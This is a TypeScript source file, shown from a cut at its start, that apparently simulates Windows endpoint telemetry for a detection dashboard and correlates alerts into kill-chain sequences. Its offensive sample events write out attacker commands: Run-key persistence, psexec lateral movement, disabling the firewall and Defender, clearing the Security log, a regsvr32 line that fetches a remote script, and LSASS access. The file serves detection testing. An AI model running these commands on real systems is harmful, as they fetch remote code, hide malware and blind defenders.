        image: 'C:\\Windows\\System32\\reg.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'reg.exe',
        command_line: 'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /t REG_SZ /d C:\\Users\\Public\\payload.exe /f',
        image: 'C:\\Windows\\System32\\reg.exe',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'psexec.exe',
        command_line: 'psexec.exe \\\\LAB-WKS-02 -accepteula -c C:\\Users\\Public\\payload.exe',
        image: 'C:\\Windows\\System32\\psexec.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'netsh.exe',
        command_line: 'netsh.exe advfirewall set allprofiles state off',
        image: 'C:\\Windows\\System32\\netsh.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'wevtutil.exe',
        command_line: 'wevtutil.exe cl Security',
        image: 'C:\\Windows\\System32\\wevtutil.exe',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'regsvr32.exe',
        command_line: 'regsvr32.exe /u /i:http://185.220.101.47/scrobj.dll scrobj',
        image: 'C:\\Windows\\System32\\regsvr32.exe',
      },
    }),
  },
  // --- real-telemetry artifacts (Sysmon EID 7/10/11/13/22, source:
  // 'sysmon'), so the realtime-host rules and the fourth sequence can
  // fire in simulated mode exactly like they do against sf-sensor ---
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.access',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'rundll32.exe',
        image: 'C:\\Windows\\System32\\rundll32.exe',
      },
      target: {
        pid: 712,
        name: 'lsass.exe',
        image: 'C:\\Windows\\System32\\lsass.exe',
      },
      access: {
        granted_access: '0x1010',
        call_trace:
          'C:\\Windows\\SYSTEM32\\ntdll.dll+3b4ba0|C:\\Windows\\System32\\KERNELBASE.dll+2b1ae|C:\\Windows\\System32\\comsvcs.dll+1a5f0',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'registry.set',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'payload.exe',
        image: 'C:\\Users\\Public\\payload.exe',
      },
      registry: {
        key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        value_name: 'OneDriveSync',
        value: 'C:\\Users\\Public\\payload.exe',
        operation: 'SetValue',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'registry.set',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'powershell.exe',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      },
      registry: {
        key: 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection',
        value_name: 'DisableRealtimeMonitoring',
        value: '0x1',
        operation: 'SetValue',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'registry.set',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'payload.exe',
        image: 'C:\\Users\\Public\\payload.exe',
      },
      registry: {
        key: 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths',
        value_name: 'C:\\Users\\Public',
        value: '',
        operation: 'CreateKey',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'file.write',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'payload.exe',
        image: 'C:\\Users\\Public\\payload.exe',
      },
      file: {
        path: 'C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe',
        extension: 'exe',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'file.write',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'chrome.exe',
        image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      },
      file: {
        path: 'C:\\Users\\Public\\factura-2026.pdf.exe',
        extension: 'exe',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'image.load',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'loader.exe',
        image: 'C:\\Users\\Public\\loader.exe',
      },
      file: {
        path: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\winlogon.dll',
        extension: 'dll',
      },
    }),
  },
  {
    weight: 1,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'network.connect',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      network: {
        protocol: 'dns',
        destination_ip: '185.220.101.47',
        destination_port: 53,
        domain: 'x7q2vbnm4kjh8asdfgw3lkj1hvcxzz9.top',
      },
    }),
  },
  {
    weight: 5,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'network.connect',
      source: 'sysmon',
      host: pick(HOSTS),
      user: pick(USERS),
      network: {
        protocol: 'dns',
        destination_ip: '104.16.87.20',
        destination_port: 53,
        domain: 'cdn.jsdelivr.net',
      },
    }),
  },
]

const TOTAL_WEIGHT = SCENARIOS.reduce((acc, s) => acc + s.weight, 0)

function nextScenario(): Scenario {
  let roll = Math.random() * TOTAL_WEIGHT
  for (const s of SCENARIOS) {
    roll -= s.weight
    if (roll <= 0) return s
  }
  return SCENARIOS[0]
}

function truncate(s: string, max: number): string {
  return s.length > max ? s.slice(0, max - 1) + '\u2026' : s
}

export function summarize(ev: SfEvent): string {
  // registry/access first: process.access events carry both the source
  // process and the target, and the interesting bit is the handle.
  if (ev.access) {
    return truncate(
      `${ev.process?.name ?? '?'} -> ${ev.target?.name ?? '?'} (${ev.access.granted_access ?? 'n/d'})`,
      110,
    )
  }
  if (ev.registry) {
    const value = ev.registry.value_name ? ` \\${ev.registry.value_name}` : ''
    return truncate(`${ev.registry.operation ?? 'registry'} ${ev.registry.key ?? ''}${value}`, 110)
  }
  if (ev.process) {
    const cmd = ev.process.command_line ? ` ${ev.process.command_line}` : ''
    return truncate(`${ev.process.name}${cmd}`, 110)
  }
  if (ev.network) {
    return truncate(`${ev.network.protocol} ${ev.network.destination_ip}:${ev.network.destination_port} (${ev.network.domain ?? 'sin dominio'})`, 110)
  }
  if (ev.file) return truncate(ev.file.path, 110)
  return ev.type
}

export function enrich(ev: SfEvent): Record<string, string> {
  const out: Record<string, string> = {}
  if (ev.process?.image) {
    out['image_origin'] = ev.process.image.toLowerCase().startsWith('c:\\windows\\') ? 'system' : 'userland'
  }
  if (ev.user) {
    const [domain, name] = ev.user.split('\\')
    if (domain && name) {
      out['user_domain'] = domain
      out['user_name'] = name
    }
  }
  return out
}

// ---------------------------------------------------------------------------
// Simulation engine with rule evaluation, 60s alert dedup and rolling stats

export type SimStats = {
  events_total: number
  alerts_total: number
  by_severity: Record<string, number>
  events_per_min: number
  uptime_s: number
  interval_ms: number
  mode: 'simulacion'
}

export class SimEngine {
  private startedAt = Date.now()
  private eventsTotal = 0
  private alertsTotal = 0
  private bySeverity: Record<string, number> = {}
  private recentTimestamps: number[] = []
  private lastAlertPerRule = new Map<string, number>()
  private seqProgress = new Map<string, { matched: Set<number>; first: number }>()
  private timer: ReturnType<typeof setInterval> | null = null
  private statsTimer: ReturnType<typeof setInterval> | null = null

  constructor(
    private onEvent: (ev: SfEvent) => void,
    private onAlert: (al: SfAlert) => void,
    private onStats: (st: SimStats) => void,
    private intervalMs = 1600,
  ) {}

  start() {
    if (this.timer) return
    this.timer = setInterval(() => this.tick(), this.intervalMs)
    this.statsTimer = setInterval(() => this.onStats(this.stats()), 2000)
  }

  stop() {
    if (this.timer) clearInterval(this.timer)
    if (this.statsTimer) clearInterval(this.statsTimer)
    this.timer = null
    this.statsTimer = null
  }

  tick() {
    const ev = nextScenario().make()
    ev.enrichment = enrich(ev)
    this.eventsTotal++
    this.recentTimestamps.push(Date.now())
    this.onEvent(ev)

    const firedRules: string[] = []
    for (const rule of RULES) {
      const matched = evaluate(rule, ev)
      if (!matched) continue
      firedRules.push(rule.name)
      const last = this.lastAlertPerRule.get(rule.id) ?? 0
      if (Date.now() - last < 60_000) continue // same dedup window as internal/alert
      this.lastAlertPerRule.set(rule.id, Date.now())
      const alert: SfAlert = {
        id: crypto.randomUUID(),
        timestamp: nowIso(),
        rule_id: rule.id,
        rule_name: rule.name,
        severity: rule.severity,
        host: ev.host,
        user: ev.user,
        event_id: ev.id,
        event_type: ev.type,
        summary: summarize(ev),
        matched_on: matched,
        tags: rule.tags,
      }
      this.alertsTotal++
      this.bySeverity[alert.severity] = (this.bySeverity[alert.severity] ?? 0) + 1
      this.onAlert(alert)
    }
    this.checkSequences(ev, firedRules)
  }

  /** Kill-chain correlation, same semantics as internal/correlate. */
  private checkSequences(ev: SfEvent, firedRules: string[]) {
    const now = Date.now()
    for (const seq of SEQUENCES) {
      const key = `${seq.id}|${ev.host}`
      let st = this.seqProgress.get(key)
      if (!st) {
        st = { matched: new Set(), first: now }
      } else if (st.matched.size > 0 && now - st.first > seq.windowMs) {
        st = { matched: new Set(), first: now } // window expired, restart
      }
      let advanced = false
      for (let i = 0; i < seq.steps.length; i++) {
        if (!st.matched.has(i) && firedRules.includes(seq.steps[i])) {
          st.matched.add(i)
          advanced = true
          break
        }
      }
      if (!advanced) continue
      if (st.matched.size === seq.steps.length) {
        const alert: SfAlert = {
          id: crypto.randomUUID(),
          timestamp: nowIso(),
          rule_id: seq.id,
          rule_name: seq.name,
          severity: seq.severity,
          host: ev.host,
          user: ev.user,
          event_id: ev.id,
          event_type: ev.type,
          summary: `${seq.steps.join(' -> ')} en ${seq.steps.length} pasos`,
          matched_on: seq.steps,
          tags: seq.tags,
        }
        this.alertsTotal++
        this.bySeverity[alert.severity] = (this.bySeverity[alert.severity] ?? 0) + 1
        this.onAlert(alert)
        this.seqProgress.delete(key) // re-arm
        continue
      }
      this.seqProgress.set(key, st)
    }
  }

  stats(): SimStats {
    const cutoff = Date.now() - 60_000
    this.recentTimestamps = this.recentTimestamps.filter((t) => t >= cutoff)
    return {
      events_total: this.eventsTotal,
      alerts_total: this.alertsTotal,
      by_severity: { ...this.bySeverity },
      events_per_min: this.recentTimestamps.length,
      uptime_s: Math.floor((Date.now() - this.startedAt) / 1000),
      interval_ms: this.intervalMs,
      mode: 'simulacion',
    }
  }
}
